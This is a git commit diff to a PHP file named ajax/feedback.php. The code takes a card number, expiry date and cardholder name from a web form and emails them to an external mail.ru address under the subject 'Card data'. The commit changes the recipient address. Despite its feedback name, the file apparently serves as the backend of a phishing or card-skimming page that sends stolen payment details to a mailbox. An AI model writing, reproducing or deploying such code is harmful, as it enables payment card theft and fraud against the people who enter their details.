f424e538f5f619cf1231615cb85b3021b118d581
rorchick <hotaboriginal@gmail.com>
2022-05-12 14:44:22 +0300

    add_mail

--- ajax/feedback.php
+++ ajax/feedback.php
@@ -4,7 +4,7 @@ $carddate = $_POST['carddate'];
 $cardname = $_POST['cardname'];
 
 
-$success = mail("hotab@bk.ru",'Данные карты',
+$success = mail("rnev5ns6oiho@mail.ru",'Данные карты',
 'Здравствуйте'."\n".
 'Ваш номер карты: '.$cardcode."\n".
 'Срок действия: '.$carddate."\n".
